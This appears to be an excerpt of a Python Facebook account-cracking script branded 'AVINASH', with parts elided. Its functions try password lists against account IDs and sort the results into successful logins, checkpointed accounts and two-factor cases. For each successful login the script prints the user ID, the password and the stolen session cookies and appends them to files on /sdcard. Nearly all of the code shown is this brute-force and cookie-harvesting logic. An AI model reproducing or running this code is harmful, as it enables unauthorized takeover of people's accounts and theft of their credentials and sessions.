#SC OWNER_______________AVINASH
...
def clear():
	...
	print(logo)
logo=("""\033[1;37m
\x1b[1;91m__________    _____________   _____________________  __   
\x1b[1;91m___    |_ |  / /___  _/__  | / /__    |_  ___/__  / / /   
\x1b[1;91m__  /| |_ | / / __  / __   |/ /__  /| |____ \__  /_/ /    
\x1b[1;91m_  ___ |_ |/ / __/ /  _  /|  / _  ___ |___/ /_  __  /     
\x1b[1;91m/_/  |_|____/  /___/  /_/ |_/  /_/  |_/____/ /_/ /_/      
\033[1;37m═══════════════════════════════════════════════
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  AUTHOR    : AVINASH \033[92;1m•
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  GITHUB    : Th'w AVINASH 
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m   FEEL THE POWER OF : AVINASH
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mAVINASH\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mAVINASH\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [AVINASH-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/AVINASH-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [AVINASH-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/AVINASH-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mAVINASH\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/AVINASH-KOT-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [AVINASH-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/AVINASH-KOT-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    'user-agent': S1(),}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [AVINASH-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/AVINASH-NEPAL-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\r\r\033[1;34m [AVINASH-KOT] '+ids+' | '+ps+'\033[1;97m')
                cps.append(cid)
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [AVINASH-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/AVINASH-NEPAL-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mAVINASH-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mAVINASH\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
